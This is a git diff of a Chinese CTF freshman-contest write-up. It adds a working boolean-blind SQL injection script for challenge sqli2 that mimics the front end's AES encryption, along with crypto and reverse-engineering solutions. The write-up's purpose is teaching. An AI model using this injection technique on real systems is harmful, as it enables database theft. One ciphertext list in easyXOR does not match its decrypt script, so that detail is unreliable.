@@ -1,4 +1,4 @@
-# 2023第四届“安恒杯”CTF新生赛
+# 2023第四届“安恒杯”CTF新生赛题解
 
 ## Misc
 
@@ -116,7 +116,7 @@ while True:
 
 ### QRCode.txt
 
-下载附件得到一串疑似RGB信息的文本，行数为29\*29，编写脚本将其转换为图片，得到缺失的二维码，补上三个定位点后扫码即可得到flag
+下载附件得到一串疑似RGB信息的文本，行数为`29*29`，编写脚本将其转换为图片，得到缺失的二维码，补上三个定位点后扫码即可得到flag
 
 ![QRCode.txt-1](https://raw.githubusercontent.com/StingerTeam/img\_bed/main/20231224173321.png)
 
@@ -475,11 +475,151 @@ auto_append_file=attack.jpg
 
 ### sqli2
 
-还没写好，明天再来看看吧\~
+考点：SQL注入布尔盲注，前端加密
+
+首先和sqli1一样尝试万能密码登录，发现可以登录，说明存在SQL注入漏洞，闭合符号为`'`，进入后台没发现flag，则尝试读取数据库内容
+
+首先猜测后端PHP代码如下：
+
+```php
+$sql = "SELECT * FROM users WHERE username = '" . $username . "' AND password = '" . $password . "'";
+```
+
+将username设为admin，如果判断条件为真（如`password=' and '1'='1`），则登录成功，否则登录失败，由此判断可以使用布尔盲注。
+
+但是抓包时发现，传递的内容经过加密的
+
+```txt
+encryptedData: 5NAk0ivg0oDSVbnzdmMyjWiFU+YeF86c9SJQSWR7rTuxHLzuZmFtPII/wU0kGu88
+```
+
+查阅前端代码，发现如下js代码：
+
+```javascript
+function encryptData(data) {
+    var key = CryptoJS.enc.Utf8.parse('4tu39rvb6h3wbif4');
+    var iv = CryptoJS.enc.Utf8.parse(key.toString(CryptoJS.enc.Utf8).substr(0, 16));
+    var encrypted = CryptoJS.AES.encrypt(JSON.stringify(data), key, {
+        iv: iv,
+        mode: CryptoJS.mode.CBC,
+        padding: CryptoJS.pad.Pkcs7
+    });
+    return encrypted.toString();
+}
+
+document.addEventListener('DOMContentLoaded', function () {
+    document.querySelector('button[type="button"]').addEventListener('click', function (event) {
+        var username = document.querySelector('input[name="username"]');
+        var password = document.querySelector('input[name="password"]');
+
+        var encryptedData = encryptData({ username: username.value, password: password.value });
+        document.querySelector('input[name="encryptedData"]').value = encryptedData;
+
+        username.remove();
+        password.remove();
+
+        document.querySelector('form').submit();
+    });
+});
+```
+
+可以看到，前端使用了AES加密，密钥为`4tu39rvb6h3wbif4`，加密模式为CBC，填充模式为Pkcs7，加密后的内容为base64编码
+
+尝试使用工具解密验证加密方式和密钥，解密成功，同时可以直观地看到明文的结构
+
+![sqli2](https://raw.githubusercontent.com/StingerTeam/img\_bed/main/20231225121259.png)
+
+加密的形式和密钥我们都已经知道了，那么这个加密过程就可以用脚本实现了
+
+**解题思路**：使用python脚本，将需要执行的语句加密后传递给后端，后端解密后执行，根据返回的结果判断是否成功，从而实现布尔盲注。这里我们仅演示手工注入，也可以使用flask框架开启一个HTTP端口接收sqlmap的请求，这样就能用sqlmap快速获取数据库的内容了。
+
+```python
+import requests
+import json
+import base64
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+
+
+# AES CBC, padding: Pkcs7
+def encryptData(data):
+    data = json.dumps(data).encode("utf-8")
+    key = "4tu39rvb6h3wbif4"
+    iv = key[:16]
+    cipher = AES.new(key.encode("utf-8"), AES.MODE_CBC, iv.encode("utf-8"))
+    encryptedData = cipher.encrypt(pad(data, AES.block_size))
+    encryptedData = base64.b64encode(encryptedData).decode("utf-8")
+    return encryptedData
+
+
+def sendRequest(data):
+    url = "http://1a93c69f-925c-4313-a3be-e82f7c46e48c.ctfd-node.stinger.team/"
+    headers = {"Content-Type": "application/x-www-form-urlencoded"}
+    data = {"encryptedData": encryptData(data)}
+    response = requests.post(url, headers=headers, data=data)
+    return response.text
+
+
+def isTrue(passwd: str):
+    data = {
+        "username": "admin",
+        "password": passwd,
+    }
+    return sendRequest(data).find("Access permitted!") != -1  # 如果登录成功则返回true
+
+
+def generatePlayload(sql: str, char_index: int, char: int):
+    return f"' or ascii(substr(({sql}),{char_index},1))>{char}#"
+
+# 使用二分法获取指定位置的字符
+def getChar(sql: str, char_index: int):
+    low = 0
+    high = 127
+    while low < high:
+        mid = (low + high) // 2
+        if isTrue(generatePlayload(sql, char_index, mid)):
+            low = mid + 1
+        else:
+            high = mid
+    return chr(low)
+
+
+def getLength(sql: str):
+    length = 0
+    while True:
+        if not isTrue(generatePlayload(sql, length + 1, 0)):
+            break
+        length += 1
+    return length + 1
+
+
+def queryBySQL(sql: str):
+    result = ""
+    length = getLength(sql)
+    print(f"sql: {sql}")
+    print(f"length: {length}")
+    for i in range(length):
+        # 逐个获取字符
+        result += getChar(sql, i)
+        print(result, end="\r")
+    print()
+    return result
+
+
+query0 = "select database()"  # 查询当前数据库名（可选）->ctf
+query1 = "select group_concat(table_name) from information_schema.tables where table_schema=database()"  # 查询当前数据库下的所有表名->flag,users
+query2 = "select group_concat(column_name) from information_schema.columns where table_name='flag'"  # 查询flag表下的所有列名->id,data
+query3 = "select data from flag"  # 查询flag表下的所有数据->flag{...}
+
+queryBySQL(query3)
+
+```
+
+如果遇到无法加解密的情况，如加密函数特别复杂，也可以使用爬虫的方式模拟输入和点击。这里不再演示。
 
 ### 黑心商店
 
-考点：任意文件读取 逻辑漏洞
+考点：任意文件读取，逻辑漏洞
 
 查看url并尝试改变参数发现，图片数据是以base64的形式传输到前端的 尝试利用这个先读取一下index.php的内容
 
@@ -543,7 +683,7 @@ auto_append_file=attack.jpg
 
 考点：摩斯密码
 
-观察文本内容，发现共有3种字词，分别是摩西、喂、?，并且?疑似作为分隔符，结合题目名，猜测是摩斯密码，将摩西和喂分别替换为-和.，?替换为空格，摩斯解码后即可得到明文。
+观察文本内容，发现共有3种字词，分别是`摩西`、`喂`、`?`，并且`?`疑似作为分隔符，结合题目名，猜测是摩斯密码，将`摩西`和`喂`分别替换为`-`和`.`，`?`替换为空格，摩斯解码后即可得到明文。
 
 下面是使用[CyberChef](https://github.com/gchq/CyberChef)的示例
 
@@ -585,9 +725,40 @@ print(m)
 
 ### easyRSA
 
-已知p, q, c, 编写RSA解密脚本即可获得flag
+```python
+# encrypt.py
+from Crypto.Util.number import *
+from flag import flag
+
+m = bytes_to_long(flag)
+assert size(m) < 360
+p = getPrime(512)
+q = getPrime(512)
+n = q * p
+e = 65537
+c = pow(m, e, n)
+print('p =', p)
+print('q =', q)
+print('c =', c)
+```
+
+这个解密脚本是基于RSA加密算法的。RSA算法是一种非对称加密算法，即加密和解密使用的是两个不同的密钥。在这个脚本中，公钥是(n, e)，私钥是(n, d)。
+
+RSA基础推荐视频: [数学不好也能听懂的算法 - RSA加密和解密原理和过程](https://www.bilibili.com/video/BV1XP4y1A7Ui/)
+
+以下是解密脚本的步骤：
+
+1. 首先，脚本导入了long\_to\_bytes函数，这个函数可以将长整数转换为字节。
+2. 然后，脚本定义了p、q和c的值。这些值在加密脚本中生成并打印出来，现在我们需要它们来解密。
+3. 脚本计算n的值，n是p和q的乘积。这是RSA公钥的一部分。
+4. 脚本计算φ(n)的值，φ(n)是欧拉函数，计算小于n且与n互质的正整数个数。在这里，φ(n) = (p-1)\*(q-1)。
+5. 脚本定义了e的值，这是RSA公钥的另一部分。
+6. 脚本计算d的值，d是e模φ(n)的乘法逆元。这是RSA私钥的一部分。
+7. 最后，脚本使用私钥(n, d)对密文c进行解密，得到明文m。解密的过程是计算c的d次方模n的余数，即c^d mod n。
+8. 脚本打印出解密后的明文m，但是m是一个长整数，所以我们需要使用long\_to\_bytes函数将其转换为字节，这样才能看到原始的明文信息。
 
 ```python
+# decrypt.py
 from Crypto.Util.number import long_to_bytes
 
 p = 9266056543660540596894853230433714137277477768240817161109767150943725091483376412440366423393090810696352884199521954839288680938321937402144565250668173
@@ -603,7 +774,33 @@ print(long_to_bytes(m))
 
 ### easyXOR
 
-简单的异或加密（与前一字节异或得到当前字节），解密脚本如下
+```python
+# encrypt.py
+from secret import flag
+
+hex_list = [hex(ord(char)) for char in flag]
+hex_list = [int(hex_str, 16) for hex_str in hex_list]
+i = 1
+while i < len(flag):
+    hex_list[i] ^= hex_list[i - 1]
+    i += 1
+
+hex_list = [hex(int) for int in hex_list]
+print(hex_list)
+# ['0x66', '0xa', '0x6b', '0xc', '0x77', '0xf', '0x3f', '0x4d', '0x12', '0x7b', '0x8', '0x57', '0x24', '0x14', '0x4b', '0x2e', '0x1a', '0x69', '0x10', '0x4f', '0x27', '0x42', '0x2a', '0x4f', '0x32']
+```
+
+这个解密脚本是基于XOR加密的。XOR加密是一种简单的对称加密算法，即加密和解密使用的是同一个密钥。在这个脚本中，密钥是前一个字符的ASCII值。
+
+以下是解密脚本的步骤：
+
+1. 首先，脚本导入了加密后的十六进制列表。
+2. 然后，脚本将十六进制列表转换为整数列表。
+3. 脚本定义了初始的明文字符串，这是已知的第一个字符。
+4. 脚本使用一个循环，从第二个字符开始，将每个字符的ASCII值与前一个字符的ASCII值进行XOR运算，得到原始的字符。然后将这个字符添加到明文字符串中。
+5. 最后，脚本打印出解密后的明文字符串。
+
+这个解密脚本的关键是理解XOR运算的性质：一个数与另一个数进行XOR运算两次，结果还是原来的数。也就是说，如果我们有a XOR b = c，那么c XOR b = a。在这个脚本中，a是原始的字符，b是前一个字符，c是加密后的字符。所以我们可以通过c XOR b得到a。
 
 ```python
 hex = ['0x66', '0xa', '0x6b', '0xc', '0x77', '0x20', '0x48', '0x31', '0x6e', '0x0', '0x6f', '0x1b', '0x44', '0x31', '0x42', '0x27', '0x78', '0x31', '0x75', '0x34', '0x49']
@@ -616,4 +813,255 @@ while i < len(hex):
 print(flag)
 ```
 
-## 其他题目将在明天上传（歇会\~）
+### 谍影重重
+
+下载文本后,发现是一篇新闻,仔细阅读后发现有部分单词拼写错误,在网上搜索[原文](https://news.cgtn.com/news/2023-12-09/China-Vietnam-eye-closer-people-to-people-bonds-1po749WWKgU/index.html),与该文本比较不同之处(在线工具或自行编写脚本),将所有不相同的字符按顺序排列后得到`meetyouatb113`,即为flag
+
+### 欧拉欧拉
+
+分析题目给出的加密程序
+
+只给出了e、n、c即公钥指数、模数以及密文
+
+观察题目特征，发现没有生成素数q的代码，仅有一素数p
+
+猜测n仅由p构成，即`n = p**k`，k可为任意整数
+
+进入以下网站尝试进行n分解：[http://www.factordb.com/index.php](http://www.factordb.com/index.php)
+
+分解n得到 n = p\*\*5
+
+计算私钥d需要先得出欧拉函数phi
+
+遂查找有关欧拉函数的性质，可找到 根据欧拉函数性质则有 phi=(p**k)-(p**k-1)
+
+尝试根据此式进行解密
+
+p = 123011670148156067171935017378169146187754569417088208031467924757125444876573376178582752555425433929702259279078270486096811298079151854743684067475773465936777306722083390498141106158684676959748784222921618751967668182812790014845198142516241615533512211354021631481436898405968025433478683545771726278893
+
+```python
+# 解密RSA加密的消息
+
+import base64
+from Crypto.Util.number import getPrime, size, bytes_to_long, long_to_bytes
+from gmpy2 import gcd, gmpy2
+
+# 给定的参数
+e = 12689622271071317571814245532013847972377339438392054564948322173666197131769716710113715493194406315075864994490775389286286292317570515711884604612401093
+n = 28166415082656188513689563821982071536447729660883147291835018056325960930891188453016776248439344244447982511429435923408016584343306149028301013240496510505156475399226458112861413001064078194484119390064672865277258972719734445600042610471101342931633189806536179135874681925981824498285368930999538426918370999993475261716831886959253889577719839944464711789529043781348655291414929186548113985253909961786523683240450801939274818274811419101501030048482164979257167107114899497144700021693810447588849935691651207366971508832962880501778343221424635214770081563496523372830092767056110350694153018683600850431550258362265962022836246538099896056566240999973423303665028663849179250780756763235245143510546992332534872948250568025311581971313750280794307195269748349790631268875544477835351823085174266997606621421102163476115290279487293010486194247907373056986572710691260381080275677915343640497922958038861469430764249975196320763278846102407951693796652921430561037019540210174527894511132777230348282933594437387922592890310592631274653904948315342859349804338904919698732682057341623838179145629027086914861118617808704629823447653575887066249014103336581150340683629844397758853994623134360528918430433743659156969691609939871749042824875669147926719056525540057079243128783712411290951486523435766226016299668190599634792976127908837604501804282506000789247795720087688199958718971688098231103739395075673775211334327562470611331244712805081347177332515809579076823133745781679054729297899479415221839472294479018560597017877693
+c = b'IP4FqjCos0GAcYZNgCNDq0vey1frQaOQsXETyWc29im4es0lCGGG+xNlZYxJ8MbLx3czVQ4y0Dp7t6tswyQ43iCdP2ik904QT+vLnIEvW5bChHKPmRsyDBD+p2SaCZEASIAm/V+puiKWIEioQs7B3SqITCw+jNKcJ5AhykyhekHFApZnndpX7Kkd1Ulk2llv0PHxS3BLWU1miTv2nkgmFdVo/6eSYSvqxHVZ72hf7ZltlU0tUmSYJIj8kQfYS3XWbEiCwznJe6ltTlJ22+Dhy6P25RLVdOfhewrP66LKCk12fJW2XdJYrXWdlZAli0kSO7LP/vBJGXyYRA0eLHdfpWp/kHkQDkS4BRlVKbnld+GfZrjlvBaUxKHrC9bVT6BTFA7CSFM9Ws30OgUlnAGF/4euJyVJjarXGyBUvwrgAfTnPMo3UkJG6wJdL++DVsnjyvEOLiFLeQCG+x2MtocnrVJu6bfnoWB27Y6ZDEoTNGy+21j/sc5PLYn7N+nn/QvSkUSSNfvCsRI+Vx4pMOJvvNozksFM3CKX5nIC5bmJjBc2ac5R4E/M3gptd2tnUgkvPAOQqDjOQHahXUO538YYhniCg+tfrGKn0KBaeanf615g8A2tRV5YKT/AQiu6DtOvTkbhh4jUuQOt91DhraCj8M/AtSe2JpIFoAObtuPIYONjGg8ZsYsjjAXlIjmIqqpWeXrhdFT0HpIVDzjW5g9ZtmzmBXafm7CRPfSC8NQwAxS5UPtQx4TS/TMdG0v+0SLNOX0jWGz6tvArtFaddQxid0c6TRspeGhVGmExbTQ1Wix/IdwkS3d9r7hsfQGcyFKs1/LuF+N/bG6OLbMzPJ7dOw=='
+
+# 计算p的五次方
+p = 123011670148156067171935017378169146187754569417088208031467924757125444876573376178582752555425433929702259279078270486096811298079151854743684067475773465936777306722083390498141106158684676959748784222921618751967668182812790014845198142516241615533512211354021631481436898405968025433478683545771726278893
+n = p**5
+
+# 计算欧拉函数phi
+phi = p**5 - p**4
+
+# 计算解密指数d
+d = gmpy2.invert(e, phi)
+
+# 解密密文
+c = bytes_to_long(base64.b64decode(c))
+m = pow(c, d, n)
+
+# 打印解密后的明文
+print(long_to_bytes(m))
+```
+
+可得到`b'flag{d66a8e00-8ada-46eb-bded-6840b583c98f}'`
+
+## reverse
+
+### test you ida
+
+测试你的ida,用ida打开后即可发现flag
+
+也可以用strings等工具查找字符串
+
+### easyBase64
+
+用ida打开,发现疑似是一个将输入的字符串Base64编码后于另一个字符串(编码后的flag)进行比较的程序
+
+观察函数没有得到有效的信息,按`Shift`+`F12`查看字符串,发现有一个疑似自定义Base64字符集和编码后的flag的字符串
+
+尝试使用自定义字符集解码字符串,得到flag
+
+![20231225185336](https://raw.githubusercontent.com/StingerTeam/img\_bed/main/20231225185336.png)
+
+### easyRe
+
+这道题目缺少了信息,即加密后的flag(工作疏忽,望谅解)
+
+```txt
+'kec`4~c?127`)14ad31)52)32=e?7)cba0145a31z5
+```
+
+反汇编后的加密函数如下
+
+```c
+_BYTE *__fastcall encrypt(const char *a1, __int64 a2)
+{
+  _BYTE *result; // rax
+  int v3[7]; // [rsp+20h] [rbp-30h]
+  char v4; // [rsp+3Fh] [rbp-11h]
+  int v5; // [rsp+40h] [rbp-10h]
+  int v6; // [rsp+44h] [rbp-Ch]
+  int j; // [rsp+48h] [rbp-8h]
+  int i; // [rsp+4Ch] [rbp-4h]
+
+  v3[0] = 3;
+  v3[1] = 7;
+  v3[2] = 1;
+  v3[3] = 4;
+  v3[4] = 5;
+  v6 = 5;
+  v5 = strlen(a1);
+  for ( i = 0; i < v5; ++i )
+    *(_BYTE *)(a2 + i) = v3[i % v6] ^ a1[i];
+  for ( j = 0; j < v5 - 1; j += 2 )
+  {
+    v4 = *(_BYTE *)(a2 + j);
+    *(_BYTE *)(a2 + j) = *(_BYTE *)(j + 1i64 + a2);
+    *(_BYTE *)(a2 + j + 1i64) = v4;
+  }
+  result = (_BYTE *)(a2 + v5);
+  *result = 0;
+  return result;
+}
+```
+
+这段代码是一个名为`encrypt`的函数，它接受两个参数：一个字符串`a1`和一个整数`a2`。这个函数的主要目的是对输入的字符串进行加密。
+
+1. 首先，函数定义了一些变量和数组`v3`，数组`v3`被初始化为`[3, 7, 1, 4, 5]`。
+2. 然后，函数计算输入字符串`a1`的长度，并将其存储在变量`v5`中。
+3. 接下来，函数进入第一个for循环，该循环遍历输入字符串的每个字符。在每次迭代中，它都会取`v3`数组中的一个元素（索引为当前字符的索引对数组长度取余）与当前字符进行异或操作，然后将结果存储在`a2 + i`的位置。
+4. 在第一个for循环之后，函数进入第二个for循环。在这个循环中，函数每次迭代两个字符，然后交换这两个字符的位置。
+5. 最后，函数在字符串的末尾添加一个空字符，以确保结果字符串是以null结尾的，然后返回这个结果字符串的指针。
+
+这个函数的加密过程包括两个步骤：首先，使用一个固定的数组对字符串进行异或操作；然后，交换字符串中的字符位置。这两个步骤共同构成了这个函数的加密算法。
+
+那么我们编写解密脚本的步骤就是：首先，将字符串中的字符位置交换回来；最后，使用一个固定的数组对字符串进行异或操作。
+
+```python
+# decrypt.py
+def decrypt(s):
+    s = list(s)
+    for i in range(0, len(s) - 1, 2):
+        s[i], s[i + 1] = s[i + 1], s[i]
+    for i in range(len(s)):
+        s[i] = chr(ord(s[i]) ^ [3, 7, 1, 4, 5][i % 5])
+    return "".join(s)
+
+print(decrypt('kec`4~c?127`)14ad31)52)32=e?7)cba0145a31z5'))
+```
+
+### py一下
+
+根据题目提示,搜索打包工具并结合图标形状,确定打包工具为pyinstaller,使用pyinstxtractor提取后得到pyc文件
+
+```cmd
+python ./pyinstxtractor.py nihaoya.exe
+```
+
+![20231225135513](https://raw.githubusercontent.com/StingerTeam/img\_bed/main/20231225135513.png)
+
+针对nihaoya.pyc进行反编译,可以使用pycdc,也可以使用[在线工具](https://tool.lu/pyc/)
+
+源码如下
+
+```python
+def haihaihai(string):
+    str1 = ''
+    for char in string:
+        if char.isalpha():
+            if char.islower():
+                rep = chr(((ord(char) - ord('a')) + 5) % 26 + ord('a'))
+            else:
+                rep = chr(((ord(char) - ord('A')) + 13) % 26 + ord('A'))
+            str1 += rep
+            continue
+        if char.isdigit():
+            rep = str((int(char) + 5) % 10)
+            str1 += rep
+            continue
+        str1 += char
+    shifted_string = str1[-4:] + str1[:-4]
+    return shifted_string
+
+input_str = input('请输入字符串: ')
+result = haihaihai(input_str)
+print(result)
+```
+
+简单的字母替换和移位加密
+
+对于小写字母，将字符替换为字母表中后五位的字母。对于大写字母，将字符替换为字母表中后十三位的字母。对于数字，将数字替换为其加上五后对10取余的结果。再将字符串循环右移四位。
+
+```python
+# decrypt.py
+def reverse_complex_replace_and_shift(string):
+    str1 = ""
+    for char in string:
+        if char.isalpha():
+            if char.islower():
+                rev = chr((ord(char) - ord('a') - 5) % 26 + ord('a'))
+            else:
+                rev = chr((ord(char) - ord('A') - 13) % 26 + ord('A'))
+            str1 += rev
+        elif char.isdigit():
+            rev = str((int(char) - 5) % 10)
+            str1 += rev
+        else:
+            str1 += char
+    
+    shifted_string = str1[4:] + str1[:4]
+    return shifted_string
+
+str2 = input()
+str3 = reverse_complex_replace_and_shift(str2)
+print(str3)
+```
+
+### simpleMaze
+
+运行程序,发现是一个迷宫游戏,`1`,`2`,`3`,`4`分别表示上下左右,flag为正确的移动路径
+
+使用ida打开,关键代码是下面这一行,用于判断行走路径是否正确
+
+```c
+if ( isValidMove((int)maze, v8, v7) )
+```
+
+查看`(int)maze`的值,发现是一串由`0`和`1`组成的字符串
+
+```txt
+01111111111001110000111000001101111111100011111000011111110111000111101110101111011101001110111011011100000110
+```
+
+再查看`isValidMove`函数,发现其功能是判断移动的目标是否为`0`
+
+由此可以推测`(int)maze`字符串中的`0`表示可以通过的路径,`1`表示不可通过的路径
+
+通过do while函数可知迷宫的大小为10\*11
+
+```c
+while ( v6 != 9 || v5 != 10 );
+```
+
+则将`(int)maze`字符串按照10\*11的大小分割,得到地图形状如下
+
+```txt
+01111111111
+00111000011
+10000011011
+11111100011
+11100001111
+11101110001
+11101110101
+11101110100
+11101110110
+11100000110
+```
+
+据此可得到flag为`flag{md5(242444414442233233322222444411114422422)}`即`flag{909449cac803ef4e95abbb0aefeaddd8}`
